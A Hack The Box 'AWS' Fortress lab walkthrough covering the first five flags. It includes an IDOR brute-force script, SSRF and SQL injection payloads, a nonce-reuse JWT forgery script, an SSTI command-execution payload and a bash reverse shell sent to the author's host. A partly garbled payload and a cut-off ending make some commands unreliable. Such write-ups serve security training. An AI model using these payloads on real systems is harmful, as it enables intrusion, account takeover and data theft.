---
title: AWS — HTB — Fortresses
author: Radeel Ahmad
pubDatetime: 2025-08-03T06:59:00Z
tags:
  - hacking
  - HTB
  - Fortress
  - AWS
  - Active Directory
description:
  Hack The Box "AWS" Fortress walkthrough — a 10-flag chain covering IDOR token brute-forcing, SSRF to an internal logs endpoint, MySQL time-based SQL injection, an itsdangerous account-confirmation bypass, ECDSA nonce-reuse JWT forgery, SSTI-to-RCE in a Flask ticket viewer, SUID binary reversing with GDB, DirtyPipe (CVE-2022-0847) for container root, AWS Lambda/SQS/DynamoDB/S3 abuse via LocalStack, and ASREPRoasting into Active Directory Domain Admin.
---

### AWS — HTB — Fortresses

In this article, I will provide a step-by-step guide to solve the Hack The Box Fortresses '**AWS'**

![](/blog/images/htb/1*cEvZ0dnCR7-a06QBuajPuA.png)

### Early Access (Flag 1)

We start the machine by scanning the machine's ports with `nmap` where we find several open ports, and DC01.

```
┌──(kali㉿kali)-[~/Downloads]
└─$ nmap -sV -sC -A 10.13.37.15
Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-03 06:59 UTC
Nmap scan report for 10.13.37.15
Host is up (0.23s latency).
Not shown: 986 closed tcp ports (reset)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
80/tcp   open  http          Apache httpd 2.4.52 ((Win64))
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.4.52 (Win64)
| http-methods:
|_  Potentially risky methods: TRACE
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-08-03 07:02:50Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: amzcorp.local0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
2179/tcp open  vmrdp?
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: amzcorp.local0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.95%E=4%D=8/3%OT=53%CT=1%CU=30675%PV=Y%DS=2%DC=T%G=Y%TM=688F09DB
OS:%P=x86_64-pc-linux-gnu)SEQ(SP=101%GCD=1%ISR=10B%TI=I%CI=I%II=I%SS=S%TS=U
OS:)SEQ(SP=103%GCD=1%ISR=106%TI=RD%CI=I%II=I%TS=U)SEQ(SP=103%GCD=1%ISR=10D%
OS:TI=I%CI=RD%TS=U)SEQ(SP=FE%GCD=1%ISR=10A%TI=I%CI=I%II=I%SS=S%TS=U)SEQ(SP=
OS:FF%GCD=1%ISR=10C%TI=I%CI=I%II=I%SS=S%TS=U)OPS(O1=M552NW8NNS%O2=M552NW8NN
OS:S%O3=M552NW8%O4=M552NW8NNS%O5=M552NW8NNS%O6=M552NNS)WIN(W1=FFFF%W2=FFFF%
OS:W3=FFFF%W4=FFFF%W5=FFFF%W6=FF70)ECN(R=Y%DF=Y%T=80%W=FFFF%O=M552NW8NNS%CC
OS:=Y%Q=)T1(R=Y%DF=Y%T=80%S=O%A=S+%F=AS%RD=0%Q=)T2(R=Y%DF=Y%T=80%W=0%S=Z%A=
OS:S%F=AR%O=%RD=0%Q=)T3(R=Y%DF=Y%T=80%W=0%S=Z%A=O%F=AR%O=%RD=0%Q=)T4(R=Y%DF
OS:=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=
OS:%RD=0%Q=)T6(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=80%W=
OS:0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=80%IPL=164%UN=0%RIPL=G%RID=G%RI
OS:PCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=80%CD=Z)

Network Distance: 2 hops
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode:
|   3:1:1:
|_    Message signing enabled and required
|_clock-skew: 1s
| smb2-time:
|   date: 2025-08-03T07:03:32
|_  start_date: N/A

TRACEROUTE (using port 80/tcp)
HOP RTT       ADDRESS
1   223.47 ms 10.10.14.1
2   223.77 ms 10.13.37.15

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 285.46 seconds
```

Update `etc/host:`

```
10.13.37.15 dc01.amzcorp.local amzcorp.local
```

When attempting to access the website via a browser, an error is returned because the domain `jobs.amzcorp.local` cannot be resolved. To address this issue, the new subdomain can be added to the `/etc/hosts` file.

```
10.13.37.15 jobs.amzcorp.local
```

![](/blog/images/htb/1*psqSJKyPIHYHK8bTKQaMgA.png)

Register new user:

![](/blog/images/htb/1*cscPf_fwZBs7CtHJedIp_A.png)

We can log in to the login and we get access to an AWS dashboard.

![](/blog/images/htb/1*FfN47QvlWKN1OJg4cCLolg.png)

Looking at the source code, we find that it loads a `.js` script called `app.js`

![](/blog/images/htb/1*kzizpTWj1o3uFDPxKxWk5g.png)

Upon opening the file, we can observe that it is obfuscated and not human-readable in its current form. To deobfuscate it, we can use **de4js.** By uploading the file to this tool, the JavaScript code becomes fully readable and easier to analyze.

![](/blog/images/htb/1*L9URGRvNViHPpyJodLATdg.png)

An interesting function is `GetToken`, which sends a `json` structure in base64 passing it username and `uuid` which are parameters entered by a client user

```
function GetToken() {
    var uuid = document.getElementById('uuid');
    var username = document.getElementById('username');
    var api_token = document.getElementById('api_token');
    var output = document.getElementById('output');
    output.innerHTML = '';
    if (username.value == "") {
        output.innerHTML = "Username value cannot be empty!";
        setTimeout(() => {
            document.getElementById('closeAlert');
        }, 2000);
        return;
    }
    xhr.open('POST', '/api/v4/tokens/get');
    xhr.responseType = 'json';
    xhr.onload = function (e) {
        if (this.status == 200) {
            api_token.append(this.response['token']);
        }
    };
    data = btoa('{"get_token": "True", "uuid":' + uuid ',"username":' + username + '}');
    xhr.send({
        "data": data
    });
}
```

We could think about getting the admin `token`, but the limitation is that we don't know its `uuid`, to bruteforce it we can create a python script that sends the data as shown in the js and bruteforces the `admin` uuid

```
#!/usr/bin/python3
import requests, base64, sys
from pwn import log

bar = log.progress("uuid")

target = "http://jobs.amzcorp.local/api/v4/tokens/get"

cookies = {"session": ".eJwtTktuw0AIvcusqwrPh4GseomuLWYG2qhxLNnOqsrdg9UuAL2feL9htk3373A5toe-hfk6wiUMMqQmNiqCTLnXSLEkIa0RQBhSojo1SrEZl6ZKDYtoJ8SELAQpN6hJ1HfUaMn9nkE-B7sZt4JUhxhGNsgFKmZhalxdLjSCF3nsuv214YJO9H2z-Vh_9O5UaczVPO6XJsQ82hiYqA_sufZRIEMBFM_pItebRw7dj4-vE7z3dXFhW2_q_Kf_2R2e_-6y6L81PF8KxVGA.aI8N1g.MbCTa-GP5xxTGBeKd9oRuqIlZU4"}
headers = {"Content-Type": "application/json"}

for uuid in range(0,1000):
    data = '{"get_token": "True", "uuid": "%d", "username": "admin"}' % uuid
    json = {"data": base64.b64encode(data.encode())}

    request = requests.post(target, headers=headers, cookies=cookies, json=json)
    bar.status(uuid)

    if "Invalid" not in request.text:
        print(request.text.strip())
        bar.success(uuid)
        sys.exit(0)
```

We execute the script and after a few seconds applying brute force it reaches uuid `955` which is valid for admin, when we make the request it returns a structure in `json` with the token of the admin user.

```
┌──(kali㉿kali)-[~/Desktop/HTB/AWS-Fortresses]
└─$ python3 flag1.py
[+] uuid: 955
{
  "flag": "AWS{S1mPl3_iD0R_4_4dm1N}",
  "token": "98d7f87065c5242ef5d3f6973720293ec58e434281e8195bef26354a6f0e931a1fd50a72ebfc8ead820cb38daca218d771d381259fd5d1a050b6620d1066022a",
  "username": "admin",
  "uuid": "955"
}
```

---

### Inspector (Flag 2)

After looking for more API paths we find `status` and doing a simple `curl` returns a **json** that curiously has several `existing subdomains`

```
┌──(kali㉿kali)-[~/Desktop/HTB/AWS-Fortresses]
└─$ curl -s http://jobs.amzcorp.local/api/v4/status | jq
{
  "site_status": [
    {
      "site": "amzcorp.local",
      "status": "OK"
    },
    {
      "site": "jobs.amzcorp.local",
      "status": "OK"
    },
    {
      "site": "services.amzcorp.local",
      "status": "OK"
    },
    {
      "site": "cloud.amzcorp.local",
      "status": "OK"
    },
    {
      "site": "inventory.amzcorp.local",
      "status": "OK"
    },
    {
      "site": "workflow.amzcorp.local",
      "status": "OK"
    },
    {
      "site": "company-support.amzcorp.local",
      "status": "OK"
    }
  ]
}
```

Going back to the deobfuscated js we also find a `/logs/get` path that contains another `logs` subdomain however we cannot access this one from outside

```
function GetLogData() {
    var log_table = document.getElementById('log_table');
    const xhr = new XMLHttpRequest();

    xhr.open('GET', '/api/v4/logs/get');
    xhr.responseType = 'json';
    xhr.onload = function (e) {
        if (this.status == 200) {
            log_table.append(this.response['log']);
        } else {
            log_table.append("Error retrieving logs from logs.amzcorp.local");
        }
    };
    xhr.send();
}
```

What we can use is the `status` path to point to `logs.amzcorp.local` and through an `SSRF` access this subdomain, for this we will need the admin `token` that we obtained, with some `regex` we save the content in `dump.txt`

```
curl -s http://jobs.amzcorp.local/api/v4/status -d '{"url": "http://logs.amzcorp.local"}' -b api_token=98d7f87065c5242ef5d3f6973720293ec58e434281e8195bef26354a6f0e931a1fd50a72ebfc8ead820cb38daca218d771d381259fd5d1a050b6620d1066022a -H 'Content-Type: application/json' | sed 's/\\n/\n/g' | sed 's/\\//g' | sed 's/""//g' > dump.txt
```

Playing with regular `expressions` we can take from the hostname field only the `base64` data and when decoding it look for an AWS string, thus we find a flag

```
┌──(kali㉿kali)-[~/Desktop/HTB/AWS-Fortresses]
└─$ cat dump.txt | jq -r '.result[].hostname' | grep -oP '[^/]+(?=\.c00\.xyz)' | base64 -d | strings | grep AWS
(AWS{F1nD1nG_4_N33dl3_1n_h4y5t4ck}
base64: invalid input
```

---

### Statement (Flag 3)

If we search for the **password** string in the JSON, we find a request where the lost password data is sent via a **GET** request. The issue is that it transmits the password to **Tyler** in plain text, so when it is URL-decoded, we can clearly see it.

```
┌──(kali㉿kali)-[~/Desktop/HTB/AWS-Fortresses]
└─$ cat dump.txt | grep password -A1 -B5
  {
    "hostname": "jobs.amzcorp.local",
    "ip_address": "172.21.10.12",
    "method": "GET",
    "requester_ip": "36.101.23.69",
    "url": "/forgot-passsword/step_two/?username=tyler&email=tyler@amzcorp.local&password=%7BpXDWXyZ%26%3E3h%27%27W%3C"
  },
```

By urldecoding the `password` field we can see the password and username:

tyler: `{pXDWXyZ&>3h''W<`

![](/blog/images/htb/1*f-aATBDz9ujbn1-ULtkZQg.png)

Going back to the `json` that we dumped in the `hostname` field, we find several subdomains. When removing the repetitions, we find 2 among them `jobs-development`

```
┌──(kali㉿kali)-[~/Desktop/HTB/AWS-Fortresses]
└─$ cat dump.txt | jq -r '.result[].hostname' | grep amzcorp.local | sort -u
company-support.amzcorp.local
jobs.amzcorp.local
jobs-development.amzcorp.local
```

In the request information to this `subdomain` we can see that the path it was made to was `/.git` so we know that there is an existing git project

```
┌──(kali㉿kali)-[~/Desktop/HTB/AWS-Fortresses]
└─$ cat dump.txt | grep jobs-development.amzcorp.local -A5 -B1
  {
    "hostname": "jobs-development.amzcorp.local",
    "ip_address": "172.21.10.11",
    "method": "GET",
    "requester_ip": "129.141.123.251",
    "url": "/.git"
  },
```

Update `/etc/host`:

```
10.13.37.15 jobs-development.amzcorp.local
10.13.37.15 company-support.amzcorp.local
```

We can dump the `.git` project files from the web using the `git-dumper` tool.

```
┌──(kali㉿kali)-[~/Desktop/HTB/AWS-Fortresses]
└─$ git-dumper http://jobs-development.amzcorp.local/.git/ dump
[-] Testing http://jobs-development.amzcorp.local/.git/HEAD [200]
[-] Testing http://jobs-development.amzcorp.local/.git/ [200]
[-] Fetching .git recursively
.
.
.
.
.
.
```

Within the `jobs_portal` folder we can see the configuration of the website, including an `API` path that allows us to update a user to `Administrators`

```
@blueprint.route('/api/v4/users/edit', methods=['POST'])
def update_users():
    if request.method == "POST":
        if request.cookies.get('api_token'):
            tokens = []
            users = Users.query.all()
            for user in users:
                tokens.append(user.api_token)
            if request.cookies.get('api_token') in tokens:
                if session['role'] == "Managers":
                    if request.headers.get('Content-Type') == 'application/json':
                        content = request.get_json(silent=True)
                        try:
                            if content['update_user']:
                                data = base64.b64decode(content['update_user']).decode()
                                info = json.loads(data)
                                if info['username'] and info['email'] and info['role']:
                                    try:
                                        specific_user = Users.query.filter_by(username=info['username']).first()
                                    except:
                                        specific_user = Users.query.filter_by(email=info['email']).first()
                                    if specific_user:
                                        if not specific_user.role == "Managers" and not specific_user.role == "Administrators":
                                            specific_user.username = info['username']
                                            specific_user.email = info['email']
                                            specific_user.role = info['role']
                                            return jsonify({"success":"User updated successfully"})
```

We create a structure in `json` as requested to add the `Administrators` role to the `test` user, after that, we encode it in `base64` as the code asks

```
┌──(kali㉿kali)-[~/Desktop/HTB/AWS-Fortresses]
└─$ echo '{"username":"test","email":"test@test.com","role":"Administrators"}' | base64 -w0
eyJ1c2VybmFtZSI6InRlc3QiLCJlbWFpbCI6InRlc3RAdGVzdC5jb20iLCJyb2xlIjoiQWRtaW5pc3RyYXRvcnMifQo=
```

Finally we make the request with the base64 data inside `update_user` to update the role by dragging the admin `api_token` and the `tyler` cookie

```
┌──(kali㉿kali)-[~/Desktop/HTB/AWS-Fortresses]
└─$ curl -s http://jobs.amzcorp.local/api/v4/users/edit \
  -d '{"update_user": "eyJ1c2VybmFtZSI6InRlc3QiLCJlbWFpbCI6InRlc3RAdGVzdC5jb20iLCJyb2xlIjoiQWRtaW5pc3RyYXRvcnMifQo="}' \
  -b api_token=98d7f87065c5242ef5d3f6973720293ec58e434281e8195bef26354a6f0e931a1fd50a72ebfc8ead820cb38daca218d771d381259fd5d1a050b6620d1066022a \
  -b session=.eJw1jktOBDEMRO-SNUJJ3EmcWXEBztCyHRtG9GeU7lkA4u5khFhWlZ7qfbvZuh7v7nL2uz65-drcxWFR9cFqhmLip0IJZQLVphnRSqsYUk6CbJwJEFhahRRQIbJgIUwU2IiwRA2xsohOaiYlcUNLgOwxVdDcavIQfbIMGDMFwpoaNTdE7of2P5s4ohzd5nP_0G0UfpJqk2WtZCheB5QhKhfAUIBL8MKewoPTla7LQM7PRfsLrV-y99vzsgstY-37omN8pY3etB-jebxutOo_4n5-AReyVsg.aJB6Gg.6HoBV5Dc49NmbQK-Oq56M8_DIRo \
  -H 'Content-Type: application/json'

{
  "success": "User updated successfully"
}
```

After logging back in, the test user has access as an `admin` in jobs

![](/blog/images/htb/1*dLT7DtGD-Dtyv-PUe7WsVQ.png)

An available path when we authenticate as an `admin` is the search engine that has a possible `sqli`, although something important is that it has a `blacklist`, however we can easily bypass it by changing things like `union` for `Union`

```
@blueprint.route('/admin/users/search', methods=['POST'])
@login_required
def search_user():
    if session['role'] == "Administrators":
        blacklist = ["0x", "**", "ifnull", " or ", "union"]
        username = request.form.get('username')
        if username:
            try:
                conn = connect_db()
                cur = conn.cursor()
                cur.execute('SELECT id, username, email, account_status, role FROM `Users` WHERE username=\'%s\'' % (username))
                row = cur.fetchone()
                conn.commit()
                conn.close()
                all_roles = Role.query.all()
                row = ""
                return render_template('home/search.html', row=row, segment="users", all_roles=all_roles)
            except sqlite3.DataError:
                all_roles = Role.query.all()
                row = ""
```

We start with the number of columns that we get with `order by`, after ordering more than `5` columns it stops showing the content so there are 5

```
test' order by 5-- -
```

![](/blog/images/htb/1*iXLYGsU_UYd80fglBdwVBQ.png)

With `union` we can represent the columns with numbers and from there work

```
' Union Select 1,2,3,4,5-- -
```

![](/blog/images/htb/1*RSka6e_miSKpJApY8JOqIg.png)

We can dump the names of the `databases` where the only one that attracts attention is the `jobs` database which is the one that is currently in use.

```
' Union Select 1,group_concat(schema_name),3,4,5 from information_schema.schemata-- -
```

![](/blog/images/htb/1*HuPMXJs_V23oaxoR7EqKPQ.png)

With a `db` name we can dump its tables, from the `jobs` database we find some interesting `tables` such as `users` or `keys_tbl`

```
' Union Select 1,group_concat(table_name),3,4,5 from information_schema.tables where table_schema='jobs'-- -
```

![](/blog/images/htb/1*j5BDckBoKJadJDyiwUe5Wg.png)

Let's start with `keys_tbl`, table from which we can list the columns that are 3 in total, of which we are only interested in 2 and these are `key_name` and `key_value`

```
' Union Select 1,group_concat(column_name),3,4,5 from information_schema.columns where table_schema='jobs' and table_name='keys_tbl'-- -
```

![](/blog/images/htb/1*KGEi0ql6uIqO0ekpqtrj2A.png)

Finally we dump those 2 columns of table `keys_tbl` and in addition to possible keys for the `AWS` service

```
' Union Select 1,group_concat(key_name,':',key_value),3,4,5 from keys_tbl-- -
```

![](/blog/images/htb/1*spmdGkB5EpBZ4Iq1mINT4g.png)

```
AWS{MySqL_T1m3_B453d_1nJ3c71on5_4_7h3_w1N}
```

---

### Relentless (Flag 4)

Earlier, we had also found a `company-support` subdomain with a login

```
http://company-support.amzcorp.local/login
```

![](/blog/images/htb/1*f3Fv1yWWoMRI2bN2z5vdLQ.png)

However, after registering a user and logging in, `Access denied returns as` the newly created account has not been enabled and does not have any permissions.

![](/blog/images/htb/1*WlBAOz3OwWmblWh8hCiWPg.png)

In the source code dumped from the `.git` we find the operation, we need to create a code from the username and password with `URLSafeSerializer` and you can send it to `/confirm-account` either by GET or POST

`/dump/jobs_portal/apps/authentication/routes.py`

```
@blueprint.route('/confirm_account/<secretstring>', methods=['GET', 'POST'])
def confirm_account(secretstring):
    s = URLSafeSerializer('serliaizer_code')
    username, email = s.loads(secretstring)

    user = Users.query.filter_by(username=username).first()
    user.account_status = True
    db.session.add(user)
    db.session.commit()

    #return redirect(url_for("authentication_blueprint.login", msg="Your account was confirmed succsessfully"))
    return render_template('accounts/login.html',
                        msg='Account confirmed successfully.',
                        form=LoginForm())
```

Since we create a `test` user `with test password` we can calculate the code

```
┌──(kali㉿kali)-[~/Desktop/HTB/AWS-Fortresses]
└─$  python3 -q
>>> from itsdangerous import URLSafeSerializer
>>> URLSafeSerializer('serliaizer_code').dumps(["test", "test"])
'WyJ0ZXN0IiwidGVzdCJd.VG9-7igrRdtu19YxfI27I9q9zIc'
>>>
```

Sending it to `/confirm_account` returns that the account has been confirmed and logging in again gives us access to the `company-support` portal

```
http://company-support.amzcorp.local/confirm_account/WyJ0ZXN0IiwidGVzdCJd.VG9-7igrRdtu19YxfI27I9q9zIc
```

![](/blog/images/htb/1*Rb0Po9dfSUAOv1Ok-8ZNAg.png)

After login:

It tells us that the `tony` user will review all requests

![](/blog/images/htb/1*UueGxZ8aNBzPDkF0AjmKFg.png)

Reviewing the code again from `.git` we find a `custom_jwt.py` file where we can see how a `cookie` is created with weak `ecdsa` cryptography

```
┌──(kali㉿kali)-[~/Desktop/HTB/AWS-Fortresses/dump]
└─$ cat support_portal/apps/authentication/custom_jwt.py
import base64
from ecdsa import ellipticcurve
from ecdsa.ecdsa import curve_256, generator_256, Public_key, Private_key, Signature
from random import randint
from hashlib import sha256
from Crypto.Util.number import long_to_bytes, bytes_to_long
import json

G = generator_256
q = G.order()
k = randint(1, q - 1)
d = randint(1, q - 1)
pubkey = Public_key(G, G*d)
privkey = Private_key(pubkey, d)

def b64(data):
    return base64.urlsafe_b64encode(data).decode()

def unb64(data):
    l = len(data) % 4
    return base64.urlsafe_b64decode(data + "=" * (4 - l))

def sign(msg):
    msghash = sha256(msg.encode()).digest()
    sig = privkey.sign(bytes_to_long(msghash), k)
    _sig = (sig.r << 256) + sig.s
    return b64(long_to_bytes(_sig)).replace("=", "")

def verify(jwt):
    _header, _data, _sig = jwt.split(".")
    header = json.loads(unb64(_header))
    data = json.loads(unb64(_data))
    sig = bytes_to_long(unb64(_sig))
    signature = Signature(sig >> 256, sig % 2**256)
    msghash = bytes_to_long(sha256((f"{_header}.{_data}").encode()).digest())
    if pubkey.verifies(msghash, signature):
        return True
    return False

def decode_jwt(jwt):
    _header, _data, _sig = jwt.split(".")
    data = json.loads(unb64(_data))
    return data

def create_jwt(data):
    header = {"alg": "ES256"}
    _header = b64(json.dumps(header, separators=(',', ':')).encode())
    _data = b64(json.dumps(data, separators=(',', ':')).encode())
    _sig = sign(f"{_header}.{_data}".replace("=", ""))
    jwt = f"{_header}.{_data}.{_sig}"
    jwt = jwt.replace("=", "")
    return jwt
```

Using the code's own functions and passing our current cookie to `decode_jwt` we can see the `json` structure that is used when creating the json web token

```
┌──(kali㉿kali)-[~/Desktop/HTB/AWS-Fortresses]
└─$ cat jwt.py
#!/usr/bin/python3
import json, base64

def unb64(data):
    l = len(data) % 4
    return base64.urlsafe_b64decode(data + "=" * (4 - l))

def decode_jwt(jwt):
    _header, _data, _sig = jwt.split(".")
    data = json.loads(unb64(_data))
    return data

print(decode_jwt("eyJhbGciOiJFUzI1NiJ9.eyJ1c2VybmFtZSI6InRlc3QwMSIsImVtYWlsIjoidGVzdDAxQGdtYWlsLmNvbSIsImFjY291bnRfc3RhdHVzIjp0cnVlfQ.9lUcvYPPKVA3rRM4hupoTsWl1Q637gklJ-gxnMbOIACHlRRgAV8Fj9uPUI1g0MpuUlwNgPailG5RuXEVaJZRLw"))
```

```
┌──(kali㉿kali)-[~/Desktop/HTB/AWS-Fortresses]
└─$ python3 jwt.py
{'username': 'test01', 'email01': 'test@test.com', 'account_status': True}
```

Same process create another account

```
┌──(venv-jwt)─(kali㉿kali)-[~/Desktop/HTB/AWS-Fortresses]
└─$ python3 jwt.py
{'username': 'test02', 'email': 'test02@gmail.com', 'account_status': True}
```

Our idea will be to impersonate the `tony` user however the `variables k` and `d` are taken from a random value for each execution so if we create it will not pass the verification with that `signature`, however we can find a research that shows us how to obtain them from 2 existing values in this case 2 `cookies`

```
k = randint(1, q - 1)
d = randint(1, q - 1)
```

With the help of the article we can create a script with 2 `jwt` created by us when registering users in order to calculate the jwt of the user `tony` with the `values k` and `d` extracted, in this way when `signing it` with the same values it will pass the verification

jwt1: cookie of user1 (test01)

jwt2: cookie of user2 (test02)

```
┌──(venv-jwt)─(kali㉿kali)-[~/Desktop/HTB/AWS-Fortresses]
└─$ cat create-jwt.py
#!/usr/bin/python3
from ecdsa.ecdsa import generator_256, Public_key, Private_key, Signature
from Crypto.Util.number import bytes_to_long, long_to_bytes
import libnum, hashlib, sys, json, base64

def b64(data):
    return base64.urlsafe_b64encode(data).decode()

def unb64(data):
    l = len(data) % 4
    return base64.urlsafe_b64decode(data + "=" * (4 - l))

def sign(msg):
    msghash = hashlib.sha256(msg.encode()).digest()
    sig = privkey.sign(bytes_to_long(msghash), k)
    _sig = (sig.r << 256) + sig.s
    return b64(long_to_bytes(_sig)).replace("=", "")

def create_jwt(data):
    header = {"alg": "ES256"}
    _header = b64(json.dumps(header, separators=(',', ':')).encode())
    _data = b64(json.dumps(data, separators=(',', ':')).encode())
    _sig = sign(f"{_header}.{_data}".replace("=", ""))
    jwt = f"{_header}.{_data}.{_sig}"
    jwt = jwt.replace("=", "")
    return jwt

jwt1 = "eyJhbGciOiJFUzI1NiJ9.eyJ1c2VybmFtZSI6InRlc3QwMSIsImVtYWlsIjoidGVzdDAxQGdtYWlsLmNvbSIsImFjY291bnRfc3RhdHVzIjp0cnVlfQ.9lUcvYPPKVA3rRM4hupoTsWl1Q637gklJ-gxnMbOIACHlRRgAV8Fj9uPUI1g0MpuUlwNgPailG5RuXEVaJZRLw"
jwt2 = "eJwtzjtOBDEQhOG7OCaw3dN29V5m5H4JhATSzG6EuDsOCOsPSt9POfOK-704ntcr3sr54eVRMCNqSxk00-oxF8MOivAYQE4XNB5s0NSxCKTmQtwQ1NUwF3g1zbUwe7QuahZHZNpkdSQTtIKFYrhwpV45B6GP1RaEfXnZkNcd179mT7uvPJ_fn_G1gwxlpsQBSneTGfttE2pMIeljmldSoPz-AVuwP-c.aJCldg.z7_LFshudGw_iuKLlilw9PtgRX4"

head1, data1, sig1 = jwt1.split(".")
head2, data2, sig2 = jwt2.split(".")

msg1 = f"{head1}.{data1}"
msg2 = f"{head2}.{data2}"

h1 = bytes_to_long(hashlib.sha256(msg1.encode()).digest())
h2 = bytes_to_long(hashlib.sha256(msg2.encode()).digest())

_sig1 = bytes_to_long(unb64(sig1))
_sig2 = bytes_to_long(unb64(sig2))

sig1 = Signature(_sig1 >> 256, _sig1 % (2 ** 256))
sig2 = Signature(_sig2 >> 256, _sig2 % (2 ** 256))

r1, s1 = sig1.r, sig1.s
r2, s2 = sig2.r, sig2.s

G = generator_256
q = G.order()

valinv = libnum.invmod(r1 * (s1 - s2), q)
d = (((s2 * h1) - (s1 * h2)) * (valinv)) % q

valinv = libnum.invmod((s1 - s2), q)
k = ((h1 - h2) * valinv) % q

pubkey = Public_key(G, G * d)
privkey = Private_key(pubkey, d)

data = {'username': 'tony', 'email': 'tony@amzcorp.local', 'account_status': True}

print(create_jwt(data))
```

When executing the script it will give us the signed jwt of the user `Tony` and by modifying our cookie in the browser and reloading we get access to the `admin` panel

```
┌──(venv-jwt)─(kali㉿kali)-[~/Desktop/HTB/AWS-Fortresses]
└─$ python3 create-jwt.py
eyJhbGciOiJFUzI1NiJ9.eyJ1c2VybmFtZSI6InRvbnkiLCJlbWFpbCI6InRvbnlAYW16Y29ycC5sb2NhbCIsImFjY291bnRfc3RhdHVzIjp0cnVlfQ.9lUcvYPPKVA3rRM4hupoTsWl1Q637gklJ-gxnMbOIABMExlnOOr2gD2I0kASFEvRCF3svLEqOsU0e2ShGdrKEg
```

![](/blog/images/htb/1*NzDBK0M7RxrI4U5hDhhURQ.png)

Going back to the `git` code in a function of this we can see an `SSTI` vulnerability since it uses the `render_template_string` function to display the data

> A server-side template injection attack (SSTI) is when a threat actor exploits a template's native syntax and injects malicious payloads into the template. The compromised template is then executed server-side. A template engine generates a web page by combining a fixed template with volatile data.
> 

> `rendered_template = render_template("home/ticket.html", ticket=ticket, segment="tickets", email=email)
return render_template_string(rendered_template)`
> 

```
@blueprint.route('/admin/tickets/view/<id>', methods=['GET'])
@login_required
def view_ticket(id):
    data = decode_jwt(request.cookies.get('aws_auth'))
    if verify(request.cookies.get('aws_auth')):
        user_authed = Users.query.filter_by(username=data['username']).first()
        if user_authed.role == "Administrators":
            ticket = Tickets.query.filter_by(id=id).first()
            ticket.status = "Read"
            db.session.commit()
            message = ticket.message
            user = Users.query.filter_by(username=ticket.user_sent).first()
            email = user.email
            blacklist = ["__classes__","request[request.","__","file","write"]
            for bad_string in blacklist:
                if bad_string in message:
                    return render_template('home/500.html')
            for bad_string in blacklist:
                if bad_string in email:
                    return render_template('home/500.html')
            for bad_string in blacklist:
                for param in request.args:
                    if bad_string in request.args[param]:
                        return render_template('home/500.html')
            rendered_template = render_template("home/ticket.html", ticket=ticket,segment="tickets", email=email)
            return render_template_string(rendered_template)
        else:
            return render_template('home/403.html')
    else:
        return render_template('home/403.html')
```

We can send the classic {`{7*7}}` payload to see if it can be interpreted

![](/blog/images/htb/1*0OAwUfnzTpt57v5tY9YQ0Q.png)

In the panel that we have as an admin we can see the tickets and in the subject field where we send `{{7*7}}` we find `49` which means that it has been interpreted

![](/blog/images/htb/1*BHtB0i4K_sIv3j54u1LNPQ.png)

We can use a payload to execute commands, something to keep in mind that `quotation marks` give us problems so it is best to use `request.args.cmd` in order to send the command through the `cmd` parameter by get and thus avoid quotation marks

```
{{ dict.mro()[-1].__subclasses__()276.communicate()[0].strip() }}
```

We send the payload in the `subject` field by creating a ticket and we can see it reflected as `admin` where it only returns the response in `b''` bytes format

![](/blog/images/htb/1*AMbgj60lHYypuALPKpK3_g.png)

We can pass a command as id in the `cmd` field that we define for example `?cmd=id` and when we execute it we can see the output of the command reflected by `www-data`

```
http://company-support.amzcorp.local/admin/tickets/view/5?cmd=id
```

![](/blog/images/htb/1*fY34XCzUNUkCLAOOKgSZ0Q.png)

Since we run commands to avoid problems with `quotation marks` and the blacklist we can create a `index.html` file containing a revshell in `bash` and share it, then we download the file with `wget` and run it with bash.

```
┌──(kali㉿kali)-[~/Desktop/HTB/AWS-Fortresses]
└─$ cat index.html
bash -i >& /dev/tcp/10.10.14.8/443 0>&1

┌──(kali㉿kali)-[~/Desktop/HTB/AWS-Fortresses]
└─$ sudo python3 -m http.server 80
[sudo] password for kali:
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

```
?cmd=wget 10.10.14.8:80/index.html
?cmd=bash index.html
```

By doing so it sends us a shell as the **user** `www-data`, in this way we get the first shell in a docker `container`

```
┌──(kali㉿kali)-[~/Desktop/HTB/AWS-Fortresses]
└─$sudo netcat -lvnp 443
[sudo] password for kali:
listening on [any] 443 ...
connect to [10.10.14.8] from (UNKNOWN) [10.13.37.15] 57721
bash: cannot set terminal process group (1): Inappropriate ioctl for device
bash: no job control in this shell
www-data@2415dc894201:~/web$id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
www-data@2415dc894201:~/web$cat ../flag.txt
cat ../flag.txt
AWS{N0nc3_R3u5e_t0_s571_c0de_ex3cu71on}
www-data@2415dc894201:~/web$
```

---

### Magnified (Flag 5)

Searching for files with `suid` privileges we found an unusual one that is `backup_tool` the file belongs to the `root` user and could make a setuid

```
www-data@2415dc894201:~/web$ find / -perm -u+s 2>/dev/null
find / -perm -u+s 2>/dev/null
/usr/bin/gpasswd
/usr/bin/passwd
/usr/bin/chsh
/usr/bin/umount
/usr/bin/chfn
/usr/bin/mount
